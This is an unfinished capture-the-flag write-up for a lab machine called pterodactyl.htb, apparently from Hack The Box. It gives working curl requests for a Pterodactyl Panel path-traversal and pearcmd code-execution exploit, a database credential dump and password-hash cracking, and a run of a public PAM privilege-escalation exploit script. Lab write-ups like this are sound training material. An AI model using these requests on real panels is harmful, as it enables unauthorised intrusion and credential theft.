```bash
============================================
  RECON SUMMARY
  Target:    10.129.24.212
  DNS:       pterodactyl.htb
  Generated: 2026-04-09 10:44:35
============================================

--------------------------------------------
  INTERESTING PATHS
--------------------------------------------

  [ http://panel.pterodactyl.htb ]
    301   /assets/
    301   /js/
    301   /themes/
    403   /admin

  [ http://pterodactyl.htb ]
    200   /
    200   /changelog.txt
    200   /global.css
    200   /Public/Header.png
    301   /Public/

--------------------------------------------
  SUBDOMAINS  (1 found)
--------------------------------------------
  panel.pterodactyl.htb

--------------------------------------------
  OPEN PORTS & SERVICES
--------------------------------------------
  22/tcp     ssh            OpenSSH 9.6 (protocol 2.0)
  80/tcp     http           nginx 1.21.5

--------------------------------------------
  WEB PORTS
--------------------------------------------
  HTTP:   80
  HTTPS:  none

============================================

=== Done! Results: /home/kali/github/ctf_tool/results/pterodactyl.htb/ ===
```

Ok so we got ssh and a website. There is also panel.subdomain which is going to be important

We visit the site and it's just a site that shows the minecraft servers ip. There is a changelog which reveals information. 

```bash
MonitorLand - CHANGELOG.txt
======================================

Version 1.20.X

[Added] Main Website Deployment
--------------------------------
- Deployed the primary landing site for MonitorLand.
- Implemented homepage, and link for Minecraft server.
- Integrated site styling and dark-mode as primary.

[Linked] Subdomain Configuration
--------------------------------
- Added DNS and reverse proxy routing for play.pterodactyl.htb.
- Configured NGINX virtual host for subdomain forwarding.

[Installed] Pterodactyl Panel v1.11.10
--------------------------------------
- Installed Pterodactyl Panel.
- Configured environment:
  - PHP with required extensions.
  - MariaDB 11.8.3 backend.

[Enhanced] PHP Capabilities
-------------------------------------
- Enabled PHP-FPM for smoother website handling on all domains.
- Enabled PHP-PEAR for PHP package management.
- Added temporary PHP debugging via phpinfo()
```

I think some imporatnt things here are the panel.pterodactyl and the backend version, php and the panel version. 

Pterodactyl.io is a open source game server management panel built with php. The version is v1.11.10 let's seeif there are some CVE's

I found this

```bash
searchsploit pterodactyl         
---------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                    |  Path
---------------------------------------------------------------------------------- ---------------------------------
Pterodactyl Panel 1.11.11 - Remote Code Execution (RCE)                           | multiple/webapps/52341.py
---------------------------------------------------------------------------------- ---------------------------------
```

https://www.exploit-db.com/exploits/52341

```bash
Pterodactyl is a free, open-source game server management panel. Prior to version 1.11.11, using the /locales/locale.json with the locale and namespace query parameters, a malicious actor is able to execute arbitrary code without being authenticated. With the ability to execute arbitrary code it could be used to gain access to the Panel's server, read credentials from the Panel's config, extract sensitive information from the database, access files of servers managed by the panel, etc. This issue has been patched in version 1.11.11. There are no software workarounds for this vulnerability, but use of an external Web Application Firewall (WAF) could help mitigate this attack.
```


```bash
curl "http://panel.pterodactyl.htb/locales/locale.json?locale=../../../pterodactyl&namespace=config/database"
{"..\/..\/..\/pterodactyl":{"config\/database":{"default":"mysql","connections":{"mysql":{"driver":"mysql","url":"","host":"127.0.0.1","port":"3306","database":"panel","username":"pterodactyl","password":"PteraPanel","unix_socket":"","charset":"utf8mb4","collation":"utf8mb4_unicode_ci","prefix":"","prefix_indexes":"1","strict":"","timezone":"+00{{00}}","sslmode":"prefer","options":{"1014":"1"}}},"migrations":"migrations","redis":{"client":"predis","options":{"cluster":"redis","prefix":"pterodactyl_database_"},"default":{"scheme":"tcp","path":"\/run\/redis\/redis.sock","host":"127.0.0.1","username":"","password":"","port":"6379","database":"0","context":[]},"sessions":{"scheme":"tcp","path":"\/run\/redis\/redis.sock","host":"127.0.0.1","username":"","password":"","port":"6379","database":"1","context":[]}}}}}   
```

Ok we got credentials for the database.
This exploit can also be used to execute arbitary code so let's try to get a shell.

The exploit works in two steps. First we create the payload

```bash
curl "http://panel.pterodactyl.htb/locales/locale.json?+config-create+/&locale=../../../../../../usr/share/php/PEAR&namespace=pearcmd&<?=system('id')?>+/tmp/payload.php"
```

We use the config-create to make the malicious php code named payload.php into /tmp
Then we just execute it. This example payload just reveals the id 

```bash
curl "http://panel.pterodactyl.htb/locales/locale.json?locale=../../../../../../tmp&namespace=payload"
```

```bash
a:13:{s:7:"php_dir";s:90:"/&locale=../../../../../../usr/share/php/PEAR&namespace=pearcmd&uid=474(wwwrun) gid=477(www) groups=477(www)
```

Ok so now we got a shell it's time to search for credentials of some sort.


From the shell we are able to run the following command
```bash
mysql -h 127.0.0.1 -u pterodactyl -pPteraPanel -D panel -e "SELECT id, username, email,password FROM users;"
id      username        email   password
2       headmonitor     headmonitor@pterodactyl.htb     $2y$10$3WJht3/5GOQmOXdljPbAJet2C6tHP4QoORy1PSj59qJrU0gdX5gD2
3       phileasfogg3    phileasfogg3@pterodactyl.htb    $2y$10$PwO0TBZA8hLB6nuSsxRqoOuXuGi3I4AVVN2IgE7mZJLzky1vGC9Pi```

This is is great. We got some creadentials

Let's crack it with john

```bash
john --show hash       
phileasfogg3:!QAZ2wsx

1 password hash cracked, 1 left
```


```bash
ssh phileasfogg3@pterodactyl.htb
** WARNING: connection is not using a post-quantum key exchange algorithm.
** This session may be vulnerable to "store now, decrypt later" attacks.
** The server may need to be upgraded. See https://openssh.com/pq.html
(phileasfogg3@pterodactyl.htb) Password: 
Have a lot of fun...
Last login: Thu Apr 9 21:03:02 2026 from 10.10.14.175
phileasfogg3@pterodactyl:~> id
uid=1002(phileasfogg3) gid=100(users) groups=100(users)
```

Ok great we got ssh access to the machine and we can read the user.txt. Now we just have to find a way to escalate our privileges.

I imported linpeas over to automate the enumeration.

```bash
phileasfogg3@pterodactyl:~> rpm -qi pam | grep Version
Version     : 1.3.0
```

https://www.exploit-db.com/exploits/52386
```bash
# Exploit Title: Linux PAM Environment - Variable Injection Local Privilege Escalation
# Description: PAM pam_env.so module allows environment variable injection via ~/.pam_environment
#              leading to privilege escalation through SystemD session manipulation
```

This epxloit takes usage
of the fact that
```bash
local graphical sessions → trusted
remote SSH sessions → less trusted
```
Let's run the PAM poisoning script

```bash
python3 52386.py -i pterodactyl.htb -u phileasfogg3 -p '!QAZ2wsx'
2026-05-02 12:22:32 [WARNING] Use only with proper authorization!
2026-05-02 12:22:32 [INFO] Starting CVE-2025-6018 exploit against pterodactyl.htb:22
2026-05-02 12:22:32 [INFO] Connecting to pterodactyl.htb:22 as phileasfogg3
2026-05-02 12:22:33 [INFO] Connected (version 2.0, client OpenSSH_9.6)
2026-05-02 12:22:33 [INFO] Authentication (publickey) failed.
2026-05-02 12:22:33 [INFO] Authentication (publickey) failed.
2026-05-02 12:22:33 [INFO] Authentication (password) successful!
2026-05-02 12:22:33 [INFO] SSH connection established
2026-05-02 12:22:33 [INFO] Starting vulnerability assessment
2026-05-02 12:22:33 [INFO] Executing check: pam_version
2026-05-02 12:22:33 [INFO] Vulnerable PAM version detected: pam-1.3.0
2026-05-02 12:22:34 [INFO] Executing check: pam_env
2026-05-02 12:22:34 [INFO] pam_env.so configuration found
2026-05-02 12:22:34 [INFO] Executing check: pam_systemd
2026-05-02 12:22:35 [INFO] pam_systemd.so found - escalation vector available
2026-05-02 12:22:35 [INFO] Executing check: systemd_version
2026-05-02 12:22:36 [INFO] Target appears vulnerable, proceeding with exploitation
2026-05-02 12:22:36 [INFO] Creating malicious environment file
2026-05-02 12:22:36 [INFO] Writing .pam_environment file
2026-05-02 12:22:36 [INFO] Malicious environment file created successfully
2026-05-02 12:22:36 [INFO] Reconnecting to trigger PAM environment loading
2026-05-02 12:22:38 [INFO] Connected (version 2.0, client OpenSSH_9.6)
2026-05-02 12:22:38 [INFO] Authentication (publickey) failed.
2026-05-02 12:22:38 [INFO] Authentication (publickey) failed.
2026-05-02 12:22:39 [INFO] Authentication (password) successful!
2026-05-02 12:22:39 [INFO] Reconnection successful
2026-05-02 12:22:39 [INFO] Testing privilege escalation vectors
2026-05-02 12:22:39 [INFO] Testing: SystemD Reboot
2026-05-02 12:22:39 [INFO] PRIVILEGE ESCALATION DETECTED: SystemD Reboot
2026-05-02 12:22:39 [INFO] Testing: SystemD Shutdown
2026-05-02 12:22:39 [INFO] PRIVILEGE ESCALATION DETECTED: SystemD Shutdown
2026-05-02 12:22:39 [INFO] Testing: PolicyKit Check
2026-05-02 12:22:39 [INFO] No escalation detected: PolicyKit Check
2026-05-02 12:22:39 [INFO] EXPLOITATION SUCCESSFUL - Privilege escalation confirmed
2026-05-02 12:22:39 [INFO] Starting interactive shell session

--- Interactive Shell ---
Commands: 'exit' to quit, 'status' for privilege check
exploit$ id
id
uid=1002(phileasfogg3) gid=100(users) groups=100(users)
```


___________________NOT FINISHED_____________________
